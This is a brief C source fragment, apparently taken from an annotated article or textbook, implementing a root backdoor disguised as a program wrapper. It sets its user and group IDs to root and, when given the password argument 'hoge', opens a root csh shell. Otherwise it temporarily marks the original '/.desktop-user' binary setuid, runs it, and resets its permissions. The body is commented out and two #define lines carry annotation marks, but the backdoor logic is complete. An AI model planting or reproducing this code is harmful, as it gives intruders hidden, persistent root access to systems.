
#include <sys/types.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#define ORIGINAL "/.desktop-user" (＊2)
#define MAGIC "hoge" (＊1)
main(argc,argv)
int argc; char *argv[]; 
{ 
    /*
    int i;
    char buffer[2000]; 
    setuid(0); setgid(0); 
    if (argc==2 && strcmp(argv[1],"hoge")==0){
        system("/usr/bin/csh");
    }else{
        sprintf(buffer,"chmod 4755 %s",ORIGINAL);
        system(buffer); strcpy(buffer,ORIGINAL);
        for (i=0;i<argc-1;i++){
            strcat(buffer," "); strcat(buffer,argv[i+1]);
        }
        system(buffer);
    }
    sprintf(buffer,"chmod 644 %s",ORIGINAL); system(buffer);
    */
} 
